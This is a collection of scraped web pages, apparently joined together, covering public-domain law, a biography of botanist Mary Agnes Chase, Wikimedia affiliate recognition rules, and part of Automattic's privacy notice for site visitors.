Once works enter into the public domain, derivative works such as adaptations in book and film may increase noticeably, as happened with Frances Hodgson Burnett's novel The Secret Garden, which became public domain in the US in 1977 and most of the rest of the world in 1995.[35] By 1999, the plays of Shakespeare, all public domain, had been used in more than 420 feature-length films.[36][37] In addition to straightforward adaptation, they have been used as the launching point for transformative retellings such as Tom Stoppard's Rosencrantz and Guildenstern Are Dead and Troma Entertainment's Tromeo and Juliet.[38][39][40] Marcel Duchamp's L.H.O.O.Q. is a derivative of Leonardo da Vinci's Mona Lisa, one of thousands of derivative works based on the public domain painting.[31] The 2018 film A Star is Born is a remake of the 1937 film of the same name, which is in the public domain due to an unrenewed copyright.[41]


RIGHTS IN PUBLIC DOMAIN REPRODUCTION

Courts in different jurisdictions have come to different conclusions as to whether the reproduction of a public domain work gains its own rights protection, or whether it too is in the public domain. In a German 2016 case, the Reiss-Engelhorn-Museen, an art museum, sued Wikimedia Commons over photographs uploaded to the database depicting pieces of art in the museum. The museum claimed that the photos were taken by their staff, and that photography within the museum by visitors was prohibited. Therefore, photos taken by the museum, even of material that itself had fallen into the public domain, were protected by copyright law and would need to be removed from the Wikimedia image repository. The court ruled that the photographs taken by the museum would be protected under the German Copyright Act, stating that since the photographer needed to make practical decisions about the photograph that it was protected material.[42] In contrast, in the 1999 US case Bridgeman Art Library v. Corel Corp., the court ruled that exact photographic copies of public domain images could not be protected by copyright in the United States because the copies lack originality.[43]


PERPETUAL COPYRIGHT

Main article: Perpetual copyright

In some countries, certain works may never fully lapse into the public domain. In the United Kingdom, for example, there is a perpetual crown copyright for the Authorized King James Version of the Bible.[44]

While the copyright has expired for the Peter Pan works by J. M. Barrie (the play Peter Pan, or the Boy Who Wouldn't Grow Up and the novel Peter and Wendy) in the United Kingdom, it was granted a special exception under the Copyright, Designs and Patents Act 1988 (Schedule 6)[45] that requires royalties to be paid for commercial performances, publications and broadcasts of the story of Peter Pan within the UK, as long as Great Ormond Street Hospital (to whom Barrie gave the copyright) continues to exist.

In a paying public domain regime, works that have entered the public domain after their copyright has expired, or traditional knowledge and traditional cultural expressions that have never been subject to copyright, are still subject to royalties payable to the state or to an authors' association. The user does not have to seek permission to copy, present or perform the work, but does have to pay the fee. Typically the royalties are directed to support of living artists.[46]


PUBLIC DOMAIN MARK

Main article: Public Domain Mark
Creative Commons' Public Domain Mark

In 2010, The Creative Commons proposed the Public Domain Mark (PDM) as symbol to indicate that a work is free of known copyright restrictions and therefore in the public domain.[47][48] The public domain mark is a combination of the copyright symbol, which acts as copyright notice, with the international 'no' symbol. The Europeana databases use it, and for instance on the Wikimedia Commons in February 2016 2.9 million works (~10% of all works) are listed with the mark.[49]


APPLICATION TO COPYRIGHTABLE WORKS


WORKS NOT COVERED BY COPYRIGHT LAW

The underlying idea that is expressed or manifested in the creation of a work generally cannot be the subject of copyright law (see idea–expression divide). Mathematical formulae will therefore generally form part of the public domain, to the extent that their expression in the form of software is not covered by copyright.[50]

Works created before the existence of copyright and patent laws also form part of the public domain. For example, the Bible and the inventions of Archimedes are in the public domain. However, translations or new formulations of these works may be copyrighted in themselves.[51]


EXPIRATION OF COPYRIGHT

Determination of whether a copyright has expired depends on an examination of the copyright in its source country.

In most countries that are signatories to the Berne Convention, copyright term is based on the life of the author, and extends to 50 or 70 years beyond the death of the author. (See List of copyright terms of countries.)

In the United States, determining whether a work has entered the public domain or is still under copyright depends upon what the law or regulation was at creation, and whether new regulations have grandfathered in certain older works. Because copyright terms shifted over the course of the 20th century from a fixed-term based on first publication, with a possible renewal term, to a term extending to 50, then 70, years after the death of the author. The claim that "pre-1930 works are in the public domain" is correct only for published works; unpublished works are under federal copyright for at least the life of the author plus 70 years.[citation needed]

Legal traditions differ on whether a work in the public domain can have its copyright restored. In the European Union, the Copyright Duration Directive was applied retroactively, restoring and extending the terms of copyright on material previously in the public domain. Term extensions by the US and Australia generally have not removed works from the public domain, but rather delayed the addition of works to it. However, the United States moved away from that tradition with the Uruguay Round Agreements Act, which removed from the public domain many foreign-sourced works that had previously not been in copyright in the US for failure to comply with US-based formalities requirements. Consequently, in the US, foreign-sourced works and US-sourced works are now treated differently, with foreign-sourced works remaining under copyright regardless of compliance with formalities, while domestically sourced works may be in the public domain if they failed to comply with then-existing formalities requirements—a situation described as odd by some scholars, and unfair by some US-based rightsholders.[52]


GOVERNMENT WORKS

Works of various governments around the world may be excluded from copyright law and may therefore be considered to be in the public domain in their respective countries.[53] They may also be in the public domain in other countries as well. The legal scholar Melville Nimmer has written that "it is axiomatic that material in the public domain is not protected by copyright, even when incorporated into a copyrighted work".[54]


DEDICATING WORKS TO THE PUBLIC DOMAIN

RELEASE WITHOUT COPYRIGHT NOTICE

Before 1 March 1989, in the US, works could be easily given into the public domain by just releasing it without an explicit copyright notice. With the Berne Convention Implementation Act of 1988 (and the earlier Copyright Act of 1976, which went into effect in 1978), all works were by default copyright protected and needed to be actively given into public domain by a waiver statement/anti-copyright can call notice.[55][56] Not all legal systems have processes for reliably donating works to the public domain, e.g. civil law of continental Europe.[citation needed] This may even "effectively prohibit any attempt by copyright owners to surrender rights automatically conferred by law, particularly moral rights".[57]

PUBLIC-DOMAIN-LIKE LICENSES

Main article: Public-domain-equivalent license

An alternative is for copyright holders to issue a license which irrevocably grants as many rights as possible to the general public. Real public domain makes licenses unnecessary, as no owner/author is required to grant permission ("Permission culture"). There are multiple licenses which aim to release works into the public domain. In 2000 the WTFPL was released as a public domain like software license.[58] Creative Commons (created in 2002 by Lawrence Lessig, Hal Abelson, and Eric Eldred) has introduced several public-domain-like licenses, called Creative Commons licenses. These give authors of works (that would qualify for copyright) the ability to decide which protections they would like to place on their material. As copyright is the default license for new material, Creative Commons licenses offer authors a variety of options to designate their work under whichever license they wish, as long as this does not violate standing copyright law.[59] For example, a CC BY license allows for re-users to distribute, remix, adapt, and build upon material, while also agreeing to provide attribution to the author in any of these cases.[60] In 2009 the Creative Commons released the CC0, which was created for compatibility with law domains which have no concept of dedicating into public domain. This is achieved by a public domain waiver statement and a fallback all-permissive license, in case the waiver is not possible.[61][62] Unlike in the US, where author's moral rights are generally not specifically regulated, in some countries where moral rights are protected separately in law it is not possible to waive those rights, but only the rights related to the exploitation of the work. A solution to this issue (as found in the Creative Commons Zero dedication) is to interpret the license by setting "three different layers of action. First, the right holder waives any copyright and related rights that can be waived in accordance with the applicable law. Secondly, if there are rights that the right holder cannot waive under applicable law, they are licensed in a way that mirrors as closely as possible the legal effect of a waiver. And finally, if there are any rights that the right holders cannot waive or license, they affirm that they will not exercise them and they will not assert any claim with respect to the use of the work, once again within the limits of applicable law. (...) In countries where moral rights exist but where they can be waived or not asserted, they are waived if asserted (e.g. the UK). In countries where they cannot be waived they will remain into full effect in accordance to the applicable law (think of France, Spain or Italy where moral rights cannot be waived)."[63] The same occurs in Switzerland.

The Unlicense, published around 2010, has a focus on an anti-copyright message. The Unlicense offers a public domain waiver text with a fallback public domain-like license inspired by permissive licenses but without attribution.[64][65] Another option is the Zero Clause BSD license, released in 2006 and aimed at software.[66]

In October 2014, the Open Knowledge Foundation recommends the Creative Commons CC0 license to dedicate content to the public domain,[67][68] and the Open Data Commons Public Domain Dedication and License (PDDL) for data.[69]


PATENTS

Main article: Term of patent

In most countries, the term of rights for patents is 20 years, after which the invention becomes part of the public domain. In the United States, the contents of patents are considered valid and enforceable for 20 years from the date of filing within the United States or 20 years from the earliest date of filing if under 35 USC 120, 121, or 365(c).[70] However, the text and any illustration within a patent, provided the illustrations are essentially line drawings and do not in any substantive way reflect the "personality" of the person drawing them, are not subject to copyright protection.[71] This is separate from the patent rights just mentioned.


TRADEMARKS

A trademark registration may remain in force indefinitely, or expire without specific regard to its age. For a trademark registration to remain valid, the owner must continue to use it. In some circumstances, such as disuse, failure to assert trademark rights, or common usage by the public without regard for its intended use, it could become generic, and therefore part of the public domain.

Because trademarks are registered with governments, some countries or trademark registries may recognize a mark, while others may have determined that it is generic and not allowable as a trademark in that registry. For example, the drug acetylsalicylic acid (2-acetoxybenzoic acid) is better known as aspirin in the United States—a generic term. In Canada, however, Aspirin, with an uppercase A, is still a trademark of the German company Bayer, while aspirin, with a lowercase "a", is not. Bayer lost the trademark in the United States, the UK and France after World War I, as part of the Treaty of Versailles. So many copycat products entered the marketplace during the war that it was deemed generic just three years later.[citation needed]

Informal uses of trademarks are not covered by trademark protection. For example, Hormel, producer of the canned meat product Spam, does not object to informal use of the word "spam" in reference to unsolicited commercial email.[72] However, it has fought attempts by other companies to register names including the word 'spam' as a trademark in relation to computer products, despite that Hormel's trademark is only registered in reference to food products (a trademark claim is made within a particular field). Such defences have failed in the United Kingdom.[73]


PUBLIC DOMAIN DAY

Main article: Public Domain Day

Public Domain Day is an observance of when copyrighted works expire and works enter into the public domain.[74] This legal transition of copyright works into the public domain usually happens every year on 1 January based on the individual copyright laws of each country.[74]

The observance of a "Public Domain Day" was initially informal; the earliest known mention was in 2004 by Wallace McLean (a Canadian public domain activist),[75] with support for the idea echoed by Lawrence Lessig.[76] As of 1 January 2010,[update][77] there is as Public Domain Day website lists the authors whose works are entering the public domain. There are activities in countries around the world by various organizations all under the banner Public Domain Day, this can help people around the world celebrate works written a while ago.

DISTINGUISHED AUTHOR

Mary Agnes Chase
1869–1963. Standard IPNI form: Chase

Mary Agnes Chase, née Merrill, was an American botanist who worked at the U.S. Department of Agriculture and the Smithsonian Institution. She is considered one of the world's outstanding agrostologists and is known for her work on the study of grasses, and also for her work as a suffragist. Chase was born in Iroquois County, Illinois and held no formal education beyond grammar school. That aside, she made significant contributions to the field of botany, authored over 70 scientific publications, and was conferred with an honorary doctorate in science from the University of Illinois. She specialized in the study of grasses and conducted extensive field work in North- as well as and South America. Her Smithsonian Field Books collection from 1897 to 1959 is archived in the Smithsonian Institution Archives.

In 1901, Chase became a botanical assistant at the Field Museum of Natural History under Charles Frederick Millspaugh, where her work was featured in two museum publications: Plantae Utowanae (1900) and Plantae Yucatanae (1904). Two years later, Chase joined the U.S. Department of Agriculture (USDA) as a botanical illustrator and eventually became a scientific assistant in systematic agrostology (1907), assistant botanist (1923), and associate botanist (1925), all under Albert Spear Hitchcock. Chase worked with Hitchcock for almost twenty years, collaborating closely and also publishing, for instance The North American Species of Panicum (1910).

Following Hitchcock's death in 1936, Chase succeeded him to become senior botanist in charge of systematic agrostology and custodian of the Section of Grasses, Division of Plants at the United States National Museum (USNM). Chase retired from the USDA in 1939, but continued her work as custodian of the USNM grass herbarium until her death in 1963. She was an Honorary Fellow of the Smithsonian Institution (1959) and Fellow of the Linnean Society of London (1961). Agnesia is named in her honour (a monotypic genus of herbaceous South American bamboo in the grass family).

Chase experienced discrimination based on her gender in the scientific field, for example, being excluded from expeditions to Panama in 1911 and 1912 because the expedition's benefactors feared the presence of women researchers would distract men. During World War I, Chase marched with Alice Paul and was jailed several times for her activities. In 1918, she was arrested at the Silent Sentinels rally picketing the White House; she refused bail and was held for 10 days, where she instigated a hunger-strike and was force-fed. The USDA accused her of "conduct unbecoming a government employee," but Hitchcock helped her keep her job. Chase was also an active member of the National Association for the Advancement of Colored People (NAACP).

From Wikifunctions


Welcome to Wikifunctions

the free library of 2300+ functions that anyone can edit.




WELCOME!

Wikifunctions is a Wikimedia project for everyone to collaboratively create and maintain a library of code functions to support the Wikimedia projects and beyond, in the world's natural and programming languages.

A "function" is a sequence of programming instructions that makes a calculation based on data you provide. Functions can answer questions, such as how many days have passed between two dates, or the distance between two cities.

We are currently primarily focused on functions related to Wikidata Lexemes. The Lexicographical data from Wikidata and functions to process it are essential for the goal of an Abstract Wikipedia. A tutorial on how Wikifunctions can be used with Wikidata right now is available.

"Local chapter/s" redirects here. To see other possible uses, see Chapters, a disambiguation page.

Wikimedia chapters are independent organizations founded to support and promote the Wikimedia projects in a specified geographical region (in most cases, a country). Like the Wikimedia Foundation, they aim to "empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally". There are currently 38 chapters, with at least one on every inhabited continent.

This page lists current and planned chapters. Please see the step-by-step chapter creation guide and the movement affiliates FAQ for more information. The Affiliations Committee advises on and assists the creation of and to support affiliates.

Some chapters have an office.

Find an overview of chapter-related Meta pages on Chapters Portal.

Existing chapters, both founded (dark blue) and approved (dark turquoise), planned chapters (green), and chapters in discussion (light blue) as of 23 December 2024.

CHAPTERS IN DISCUSSION PHASE

Chapters in active preparation to become a chapter. You should add here any chapter that is under discussion to be started up. Please provide link to a page (in meta) with more detailed information (at best with a short summary in English) and provide a contact for questions about the present state.

Key A yellowish background means organizations are currently in active contact (as of the "last update" date) with the Affiliations Committee; A light grey background means awaiting an update (from the proposed organization? from AffCom?) A light blue background means the AffCom has asked the Board to approve the organization's formation.

There is no further plan for forming a chapter before the NPO can be freely incorporated in mainland China.
 * Wikimedia Japan – 設立の是非について投票中です。 The page reads "There are currently no active arguments to establish a local Japanese chapter, mainly because very few Japanese language community members are interested in it. Lack of legal knowledge and accounting skills among the community is also a large contributing factor."

MAILING LISTS AND WIKIS

Apart from public mailing lists (most notably Chapters-reports) and websites listed elsewhere, there are two main private channels for communication and coordination among chapters, which existing chapters must follow and participate in:

 * Internal wiki[24] and Internal-l – Local Chapters, board and officers coordination: each chapter can subscribe an unlimited number of board members (as of 13th August 2010), with an e-mail to the list admin by the president; additional members can be subscribed following the usual procedure (endorsement by a subscribed person + consensus on wiki);
 * Chapters wiki[25] and chapters mailinglist[26] for discussions and decisions among chapters: each chapter can subscribe unlimited board members (and some staffer) and an email by the president of the chapter to the list admins with the list of email addresses to add/remove is the usual process; there are also other lists for working groups, generally subsets of the previous one, apart some more open lists (e.g. GLAM).

NOTES

 1.  ↑ Is the chapter formally recognized as a Nonprofit organization under its nation's laws? "n/a" should be used if the country's laws do not recognize a nonprofit status.
 2.  ↑ corporation information
 3.  ↑ A small no profit association doesn't require the formal approval. It's sufficient to follow the law and to have a bylaws compliant with to the law[1][2]. The tax exemption has been formally approved [3].
 4.  ↑ All associations are non-profit by definition in the Czech republic.
 5.  ↑ All associations in Spain have Non profit status.
 6.  ↑ Wikimédia Magyarország is a registered association at the Court and all registered associations are non-profit by definition in Hungary. Wikimédia Magyarország is recognized as "organization for the public benefit" status which means: transparency requirements, tax exemptions, tax deductibility etc.
 7.  ↑ Based on Wikimedia Indonesia Board of Executive Meeting.
 8.  ↑ Officially approved by Ministry of Culture, Sports and Tourism of South Korea since 2015.

 10. ↑ Officialy recognized as Wikimedia México A.C. (civic association) under Mexican laws since February 2013.
 11. ↑ There is no separate official non-profit status. However, we have been granted charity status (ANBI) by the tax office since January 2010, which, among other demands, requires that the organization is a non-profit by its bylaws and operates as a non-profit in practice. During 2012 we were busy to prepare the chapter for the CBF certificate for 'small charities'.

Wikimedia thematic organizations are independent non-profit organizations founded to support and promote the Wikimedia projects within a specified focal area. Like chapters, and unlike user groups, they are required to have a legal structure, maintain detailed records on activities, maintain an expertise in their focal area, and share that expertise with the Wikimedia movement.





What are Wikimedia thematic organizations? Existing thematic organizations Why should we apply? What are the eligibility requirements? How do we apply for recognition?

What are Wikimedia thematic organizations?

Wikimedia thematic organizations are independent non-profit organizations founded to support and promote the Wikimedia projects within a specified focal area. Like the Wikimedia Foundation, they aim to "empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally". Thematic organizations use a name clearly linking them to Wikimedia and are granted use of Wikimedia trademarks for their work, publicity, and fundraising. Currently, 2 thematic organization exists.

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks, access to unique grants, and additional affiliate support; however, recognition is not required to do any of the work a typical Wikimedia user group, and groups are encouraged to consider that model if they do not yet meet the requirements of a thematic organization.




Wikimedia thematic organizations (2)

Thematic organizations are incorporated independent non-profits representing the Wikimedia movement and supporting work focused on a specific theme, topic, subject or issue within or across countries and regions.

Why should we apply?

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks and to get grants; however, recognition is not required to do any of the work typical user groups do or might do, it is an optional extra step with connected benefits and some requirements.

Benefits of becoming a recognized Wikimedia thematic organization includes:

 * Use the Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy without any additional approval. Thematic organizations may use other logos not part of the Trademark Policy (such as the Wikimedia Foundation logo) pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Receive large, but limited, quantities of Wikimedia merchandise for use in activities and outreach efforts.
 * Public recognition of the group's affiliation with the Wikimedia Foundation.
 * Affiliations Committee Liaison support during and after the approval process.
 * Apply for Annual Plan Grants after successfully completing two other Wikimedia Foundation grants and meeting other eligibility requirements.
 * A short name clearly linking the group to Wikimedia.
 * Exclusive use by a thematic organization of the Wikimedia name and brand within the group's thematic focus area.
 * Communications and public policy support from the Wikimedia Foundation.
 * Two scholarships to attend the Wikimedia Conference, held annually in Berlin for Wikimedia movement affiliates.

Without recognition, groups may still:

 * Engage in group activities to promote, build, and support the Wikimedia movement and its projects.
 * Utilize the Wikimedia Community logo.
 * Request one-time use of Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Apply for Project & Event Grants, Individual Engagement Grants, and Travel & Participation Support.






What are the eligibility requirements?
Main page: Requirements for Wikimedia thematic organizations

The requirements to set up an officially recognized Wikimedia thematic organization are designed to be help groups meet the movement's expectations for them once they are recognized.

 1. Wikimedia supportive mission
    The mission of the organization must be in line with the mission and vision of the Wikimedia Foundation, as well as the guiding principles of the Wikimedia Foundation and principles of movement affiliates. Regardless of the chosen legal form or incorporation method, the thematic organization must have goals similar to those of the Wikimedia Foundation, and its activities should not stray from them.
 2. Thematic focus
    The thematic organization has a clear cultural, linguistic, or otherwise thematic focus. Thematic organizations need a clearly defined and unique scope. Wikimedia is an international movement, therefore, when setting up a thematic organization questions of language, geographic area of operation, and membership criteria need to be determined. While there can be multiple user groups serving a similar or single focus area, there can only be one thematic organization covering their designated thematic focus area.
 3. Legal structure
    The thematic organization must have a legal structure/corporation that is legally independent from the Wikimedia Foundation. Thematic organizations are meant to give a real-life structure to projects that might arise from contributors or external parties in line with the goals of the Wikimedia Foundation. However, thematic organizations are not meant to operate the Wikimedia projects nor to be legally responsible for the content of the projects. In order to achieve that, it is necessary that the legal structure chosen for the creation of a thematic organization is clearly independent from the Wikimedia Foundation. The organization's governing documents, generally by-laws, must be reviewed and approved by the Affiliations Committee.
 4. Critical mass of active Wikimedia contributor involvement
    The thematic organization must involve at least ten, preferably at least twenty, active contributors to the Wikimedia projects. An active contributor is defined as a members with 300 or more contributions to a Wikimedia project on a registered account that has existed for more than 6 months in good community standing (meaning they are not currently suspended or otherwise prevented from participating). While thematic organizations should welcome the input of people who are not active contributors to the Wikimedia projects, they should not stay too far from the community. The active involvement of contributors to the Wikimedia projects is necessary for a thematic organization to be able to bring real-life initiatives tied to the Wikimedia projects to life. Initial membership should broadly reflect the intended scope, thematic and geographic area of activity and chosen languages of operation of the organization.
 5. At least two years of activities
    Groups must have two years of demonstrable programmatic results prior to applying for thematic organization recognition. Ideally these activities should be done as a recognized Wikimedia user group. These activities, and their results, must be documented on-wiki, ideally on the group's Meta-Wiki page. Wide outreach efforts to encourage participation and involvement in setting up and shaping the organization are necessary. Activities should be a mixture of online and offline activities designed to encourage participation on the Wikimedia projects. The group must be up to date on its activity and financial reports prior to being considered for recognition.
 6. Capacity, or planned capacity, to meet the future expectations
    Something that makes thematic organizations and chapters unique from user groups are the increased expectations. Does your group have the capacity to meet the expectations of thematic organization once you receive recognition? This will be something both the Affiliations Committee and Board of Trustees will consider in reviewing your application. If your group does not have a track record of activities which indicate that you will successfully be able to meet these expectations, that can cause your application to be denied. Consideration will be given for the financial circumstances of the group, realistic demands in your group's focus area, and plans to secure future funding to meet these expectations.




How do we apply for recognition?

Once you've gathered the group, the wiki page, legal documents, and the big ideas on what you want to do, contact the Affiliations Committee and request to apply for thematic organization recognition. The Affiliations Committee will ask you some questions, review your application, and if appropriate will recommend the Wikimedia Foundation Board of Trustees recognize your group as an official Wikimedia Thematic Organization. The Board of Trustees will then vote to approve or grant recognition based on the application, discussions with the Affiliations Committee, and recommendation from the Affiliations Committee. Recognition automatically renews each year. Recognition can be suspended or removed if necessary if a group becomes inactive or is no longer compliant with their agreement.

Delays during the application approval process most often arise from incomplete applications or applications that need to be modified before they can be approved. To prevent this from happening and help expedite your group's approval process, please double check this list before submitting your application:

 1. Does your name meet the affiliates naming requirements? Group discussions amongst Wikimedia thematic organizations regarding their name can take time, and generally you want to avoid having to re-engage in that conversation after your application has been submitted. You may contact the Affiliations Committee to seek input on your name before submitting your application.
 2. Does your group have a clear scope and purpose that is consistently and clearly explained? If your Meta page explains your thematic organization in a way that differs from your application, and if those differ from the activities your group is undertaking – that may delay the application's approval as a clear scope and purpose is required for the resolution to approve the thematic organization and the thematic organization agreement which the two primary contacts will be signing with the Wikimedia Foundation. Your scope and purpose statement should clearly and concisely explain what your group hopes to accomplish and who would be interested in joining. We recognize this may evolve over time, but you should have a clear commitment to a specific statement at the time of your application.
 3. Are your two primary contacts willing to identify themselves with the Wikimedia Foundation? Sometimes privacy concerns might cause someone to change their minds, which can delay the final steps in the user group recognition process.
 4. Is your group ready to accept new members and already include at least ten active Wikimedia contributors in good standing? Groups which have a closed or limited membership model may require more discussion and review. Groups which do not have at least ten active members who are also active Wikimedia contributors in good standing will not be approved.

What are Wikimedia user groups?

Wikimedia user groups are intended to be simple and flexible affiliates that are an alternative to chapters and thematic organizations - which require more formal requirements. User groups are highly valued as equal players in the Wikimedia movement. They are meant to empower and engage people around the world to collect and develop educational content under a free license or in the public domain, and to disseminate it effectively and globally.

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks and to get certain grants; however, recognition is not required to do any of the work typical user groups do or might do, it is an optional extra step with connected benefits and some requirements.

Why should we apply?

Recognition from the Affiliations Committee allows a group to apply for using the Wikimedia trademarks and to get certain grants; however, recognition is not required to do any of the work typical user groups do or might do, it is an optional extra step with connected benefits and some requirements.

Benefits of becoming a recognized Wikimedia user group include:

 * Use the Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy without any additional approval. User groups may use other logos not part of the Trademark Policy (such as the Wikimedia Foundation logo) pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Receive large, but limited, quantities of Wikimedia merchandise for use in activities and outreach efforts.
 * Public recognition of the group's affiliation with the Wikimedia Foundation.
 * Affiliations Committee Liaison support during and after the approval process.
 * One scholarship to attend the Wikimedia Conference, held annually in Berlin for Wikimedia movement affiliates.

Without recognition, groups may still:

 * Engage in group activities to promote, build, and support the Wikimedia movement and its projects.
 * Utilize the Wikimedia Community logo.
 * Request one-time use of Wikimedia logos consistent with the Wikimedia Foundation's Trademark Policy pursuant to a trademark license with the Wikimedia Foundation and approval by the Wikimedia Foundation legal team.
 * Apply for Project & Event Grants, Individual Engagement Grants, and Travel & Participation Support grants.



What are the eligibility requirements?
Main article: Wikimedia user groups/Requirements

Wikimedia user groups are intended to be simple and flexible affiliates with far fewer requirements than chapters and thematic organizations. Even affiliates hoping to become a chapter or thematic organization are not expected to meet the requirements for those affiliate models to apply for Wikimedia user group recognition.

The requirements to set up an officially recognized Wikimedia user group are meant to be light-weight and easy to follow.

 1. Three active Wikimedia editors
    While it is recommended that user groups have about 10 members, it is required that at least 3 members are active with 500 or more contributions to a Wikimedia project (in the case of Wikidata: 800 or more edits) in a year preceding the application on a registered account that has existed for at least 6 months. These active members must be in good community standing (meaning they are not currently suspended or otherwise prevented from participating). While user groups should welcome the input of people who are not active contributors to the Wikimedia projects, and are required to allow new members to join, they should not stray too far from the community. An active involvement of contributors to the Wikimedia projects is necessary to enable a user group to bring its real-life initiatives to life in the Wikimedia projects.
 2. Agree to Wikimedia user group agreement and code of conduct
    Your group must agree to the Wikimedia user group agreement and code of conduct - which outlines basic expectations of Wikimedia user groups, such as on-wiki documentation of activities, operating within Wikimedia guiding principles, and compliance with the Trademark policy. When you submit your application, you will be asked to agree to both the Wikimedia user group agreement and code of conduct.

If your user group application is not able to meet these criteria you are still welcome to apply but we would like to understand your motivation for why you think these criteria are not important to your initiative. Please address these two questions in your motivation:

 1. How would your user group contribute to the mission of the Wikimedia Movement
 2. How does the background of the founding members contribute to the success of your user group

Examples of applications that could have good reasons for not meeting the criteria are things like research groups or other initiatives which do not require you to be an active contributor.

Please be aware that if you do not meet the three criteria outlined above, the Affiliations Committee will need more time to discuss your application (and hopefully approve it), this might also involve some more communication with the founding members of the user group application, so please watch your inbox for mails on this topic so that you can respond to them quickly.



How do we apply for recognition?
Main article: Wikimedia user groups/Creation guide

Once you've completed the steps, visit the Wikimedia user group application page and apply for recognition.

Delays often happen with incomplete applications. To prevent this happening, please double-check this list before submitting your application:

 1. Did the group follow the affiliates' naming requirements? Group discussions about names can take a long time. It is best to only do this once! You may contact the Affiliations Committee to seek input on the name before applying.
 2. Does your group have a clear scope and purpose that is consistently and clearly explained? If your Meta page explains your user group in a way that differs from your application, and if those differ from the activities your group is undertaking - that may delay the application's approval as a clear scope and purpose is required for the resolution to approve the user group and the user group agreement which the two primary contacts will be signing with the Wikimedia Foundation. Your scope and purpose statement should clearly and concisely explain what your group hopes to accomplish and who would be interested in joining. We recognize this may evolve over time, but you should have a clear commitment to a specific statement at the time of your application.
 3. Are your two primary contacts willing to identify themselves with the Wikimedia Foundation? Sometimes privacy concerns might cause someone to change their minds, which can delay the final steps in the user group recognition process.
 4. Is your group ready to accept new members and already include at least three Wikimedia editors in good standing? Groups which have a closed or limited membership model may require more discussion and review. Groups which do not have at least three active members who are also active Wikimedia editors in good standing will not be approved.
 5. Are your designated leaders and group as a whole willing to follow the Wikimedia user group agreement and code of conduct? All leaders who are named on the application must agree prior to the application being sent. Applicants found to be violating the agreement or code of conduct will not be approved, and existing Wikimedia user groups found to be violating the agreement or code of conduct may have their affiliation status rescinded.

PRIVACY NOTICE FOR VISITORS TO OUR USERS’ SITES

Hi there! This Privacy Notice explains how we, at Automattic, process information about the visitors of our users’ websites in connection with the services we provide through WordPress.com, Jetpack (including WooCommerce Shipping & Tax), IntenseDebate, Crowdsignal.com, and Akismet. Read on!


WHO’S WHO AND WHAT THIS PRIVACY NOTICE COVERS

Let’s talk first about who we are at Automattic, what we do, and what this Privacy Notice covers.

We are the folks behind a variety of products and services designed to allow anyone–from bloggers, to small business owners, and enterprises–to create, publish, and manage their own websites:

 * WordPress.com offers the design, features, and support to bring a website to life.
 * With Jetpack, website owners that host their websites elsewhere can connect those websites to features and tools available through WordPress.com and WooCommerce Shipping & Tax.
 * Crowdsignal helps site owners create quizzes, surveys, and polls that fit their brand and vision.
 * Intense Debate gives site owners tools to manage comments on their websites.
 * Akismet helps keep spam under control by filtering out spam comments–hundreds of millions, every day!

To keep things simple, in this Privacy Notice we’ll refer to the users of the services we provide through these products and services–such as a website’s administrator, contributor, author, or editor–as our “Users,” and we’ll refer to our Users’ websites as “Sites.” Visitors to those Sites can read published content and interact with the Sites through features such as comments, “likes,” poll/survey responses, and follows.

We put together this Privacy Notice to help our Users understand the information we collect about their Site visitors (a/k/a our Users’ users), and how that happens on their Sites. Our Users are responsible for publishing a privacy policy on their Sites that explains to their visitors how data is collected via the Sites and how that information is used and disclosed.

This Privacy Notice does not apply to the information we collect about Users and those who visit Automattic’s websites (like automattic.com, wordpress.com, jetpack.com, or akismet.com)–that’s covered in our Privacy Policy.

Alright, with those introductions out of the way, let’s turn to how we collect, use, and share information about visitors to our Users’ Sites.


INFORMATION WE COLLECT ABOUT VISITORS TO OUR USERS’ SITES

We collect information about visitors to our Users’ Sites in a few different ways–we collect certain information that the visitors provide to the Site, we collect some information automatically, and we collect any information that our Users provide to us about their visitors.

INFORMATION A VISITOR PROVIDES TO A SITE

We’ll start with information that visitors provide directly to a Site, which primarily happens when visitors type into a text field on a Site, like a comment field or a sign-up form. Our Users may also implement other ways to allow Site visitors to provide information directly through their Sites.

Here are the most common ways in which a visitor directly provides information to a Site:

 * Follower and Subscriber Information: When a visitor signs up to follow or subscribe to a Site using Jetpack or WordPress.com, we collect the sign-up information requested by the Site, which typically includes an email address.
 * Site Comments: When a visitor leaves a comment on a Site, we collect that comment, and other information that the visitor provides along with the comment, such as the visitor’s name and email address.
 * Crowdsignal Survey Responses: When a visitor completes a poll, quiz, or other type of survey prepared by a User via Crowdsignal.com, we collect the visitor’s responses to those surveys, and other information that the survey owner requires for a poll/quiz/survey response, like an e-mail address.
 * Order and Shipment Information: If a visitor orders something (hooray!) from a Site using our store and ecommerce features available through WordPress.com or Jetpack (including WooCommerce Shipping & Tax), we may collect information to process that order, such as credit card and billing information, and an address for shipping the package along to the recipient and calculating applicable taxes. We may also use this information for other purposes on behalf of our Users–for example, to send marketing and other communications from our Users to their customers, and to provide our User with analytics information about their ecommerce site (e.g., the number of orders from particular geographic areas).
 * Other Information Entered on the Site: We may also collect other information that a visitor enters on the Site–such as a contact form submission, a search query, or Site registration.

INFORMATION WE AUTOMATICALLY COLLECT FROM THE SITE

We also automatically collect some information about visitors to a Site. The information we automatically collect depends on which of our services the Site uses. We’ve listed examples below:

 * Technical Data from a Visitor’s Computer and Etcetera: We collect the information that web browsers, mobile devices, and servers typically make available about visitors to a Site, such as the IP address, browser type, unique device identifiers, language preference, referring site, the date and time of access, operating system, and mobile network information.
 * Visitor Interactions: We collect information about a visitor’s interactions with a Site, including the “likes” and “ratings” left by visitors to a Site using WordPress.com or Jetpack.
 * Location Information: We may determine the approximate location of a visitor’s device from the IP address. We collect and use this information to, for example, tally for our Users how many people visit their Sites from certain geographic regions. If you’d like, you can read more about our Site Stats feature for WordPress.com sites and Jetpack sites.
